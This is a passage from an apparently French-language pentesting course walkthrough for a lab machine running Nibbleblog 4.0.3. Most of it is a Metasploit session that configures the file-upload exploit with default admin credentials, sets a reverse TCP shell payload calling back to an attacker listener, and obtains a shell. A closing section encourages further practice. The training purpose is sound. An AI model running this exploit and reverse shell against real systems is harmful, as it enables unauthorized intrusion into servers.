msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > show options 

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.190  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  nibbleblog       yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.2      yes       The listen address (an interface may be specified)
   LPORT  4444            yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Command shell session 4 opened (10.10.14.2:4444 -> 10.129.42.190:53642) at 2021-04-21 16:32:37 +0000
[+] Deleted image.php

id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

À partir de là, nous pouvons suivre le même chemin d'élévation de privilèges.

### Next Steps

Suivez attentivement les instructions et testez chaque étape par **vous-même**. Essayez d'autres outils et méthodes pour obtenir le **même résultat**. Prenez des notes détaillées sur votre propre parcours d'exploitation, même si vous suivez simplement les étapes décrites dans cette section. C'est une bonne pratique qui vous permettra d'acquérir de solides réflexes et qui vous **sera très utile tout au long de votre carrière**. Si vous tenez un blog, publiez un tutoriel sur cette machine et partagez-le sur la plateforme. Sinon, créez-en un. Évitez simplement d'utiliser Nibbleblog version 4.0.3.

Il existe souvent plusieurs façons d'accomplir la même tâche. Comme il s'agit d'une machine ancienne, d'autres méthodes d'élévation de privilèges, comme l'exploitation d'un **noyau obsolète** ou d'une **faille de service**, sont probables. Mettez-vous au défi d'explorer la machine et de rechercher **d'autres failles**. Existe-t-il d'autres moyens d'exploiter l'application web Nibbleblog pour obtenir un reverse shell ? Étudiez attentivement ce tutoriel et assurez-vous de bien comprendre chaque étape avant de passer à la suivante.

**Cours complété**

{% include comments.html %}